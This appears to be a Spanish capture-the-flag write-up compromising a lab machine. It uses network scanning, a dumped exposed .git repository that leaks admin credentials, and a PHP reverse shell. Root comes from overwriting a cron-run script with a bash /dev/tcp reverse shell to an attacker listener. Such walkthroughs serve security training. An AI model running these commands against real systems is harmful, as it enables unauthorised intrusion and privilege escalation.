Primero Obtenemos la IP de nuestra maquina atacante:
```
ifconfig
```

Utilizando " netdiscover " procedemos a encontrar los equipos conectados en la red:
```
sudo netdiscover -r 192.168.1.0/24
```

Una ves encontrada la IP de la maquina victima comenzamos a realizar un escaneo de puertos, utilizaremos " nmap ":
```
sudo nmap -sV -sC 192.168.1.17
```

Despues del escaneo con nmap obtenemos 2 servicios, un ssh por el puerto 22 y el http por el pueto 80.
![[nmap.png]]

En el escaneo nos muestra información sobre el repositoriuo del git, esto es un punto muy importante ya que tenemos un repositorio expuesto y con esto podemos ver el proyecto completo y el historial de cambios:
```
http-git: 
|   192.168.1.17:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: minor changes
```

Revisando para ver si tiene una paguina web levantada vemos lo siguiente:
![[web.png]]

Aunque revisando el código de la paguina no encontramos nada, procedemos hacer una enumeración de directorios:
```
sudo dirsearch -u http://192.168.1.17/
```

Encontramos directorios activos pero confirmamos que tiene expuesto el repositorio por lo que podriamos clonar el proyecto.
![[dirsearch.png]]

Vamos a clonar el repositorio, pero antes vamos a instalar la herramienta "GitTools":
```
git clone https://github.com/internetwache/GitTools
cd GitTools/Dumper
bash gitdumper.sh http://192.168.1.17/.git/ ./repo
```
Y ahora vamos a clonar el repositorio vulnerable:
```
gitdumper http://192.168.1.17/.git/ ./repo
```
Y ahora vamos a recuperarlo:
```
extractor ./repo ./recovered
```

Esto nos recostruye un árbol de carpetas ya que no nos reconstruye el repositorio completo tal ves por que este dañado, pero nos trae los commits individuales:
![[commits.png]]

Dentro de la carpeta "recovered" se encuentra 3 carpetas que representa el hash del commit en este caso temos 3 y vamos a ir revisando cada carpeta pera ver cambios realizados en el proyecto:
0-3db5628b550f5c9c9f6f663cd158374035a6eaa0  
1-a89a716b3c21d8f9fee38a0693afb22c75f1d31c  
2-cc1ab96950f56d1fff0d1f006821cab6b6b0e249 

Al revisar cambios en el commit "" encontramos un usuario y contraseña para el inico de sesión:
Usuario: admin
Contraseña: st@mpch0rdt.ightiRu$glo0mappL3
![[pass.png]]

Como no podemos iniciar sesión por SSH vamos a intentar conectarnos por una reverse shell con extención php, podemos revisar código de reverse shell php en el siguiente link: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

Cambiar la ip y port para poder estar en escucha con netcat, configuración del código:
![[ip_shell.png]]

Ponernos a la escucha con netcat:
```
nc -lvp 1234
```

Una ves dentro podemos usar el comando para abrir una shell mas comoda y adecuada:
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Buscamos la primera flag en la ruta: /home/eric y hacemos un cat para ver lña flag:
```
cat flag.txt
```

Flag: 89340a834323

Para elevar privilegios, hay un cronjob ejecutandose para "backup.sh" cada 5 min, entonces vamos a insertar en ese archivo .sh la siguiente instrucción y esperar a que se ejecute el cronjob para acceder como root:
```
echo "/bin/bash -i >& /dev/tcp/192.168.1.71/4545 0>&1" > backup.sh
```


Una ves accedemos poniendo e netcat en escucha por el puerto 4545:
```
nc -l -v -p 4545
```

Podemos ahora si ver la flog.txt del user root:
```
cat flag.txt
```

Flag root: 6a347b975dd18ae6497c
